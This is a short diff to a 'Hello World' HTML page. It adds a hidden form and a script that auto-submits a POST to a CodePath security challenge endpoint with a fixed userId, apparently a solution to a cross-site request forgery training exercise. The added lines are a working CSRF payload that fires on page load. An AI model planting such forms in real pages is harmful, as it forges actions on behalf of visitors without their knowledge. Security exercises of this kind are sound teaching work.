@@ -3,5 +3,10 @@
 <body>
 <h1>Hello World</h1>
 <p>I'm working!</p>
+<FORM NAME="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+<input type="hidden" name="userId" value="e7d9dfabd8cd8efbd468bf63dff47a56df8f8b40"/>
+<input type="submit"/>
+</FORM>
+<script>document.csrfForm.submit();</script>
 </body>
 </html>
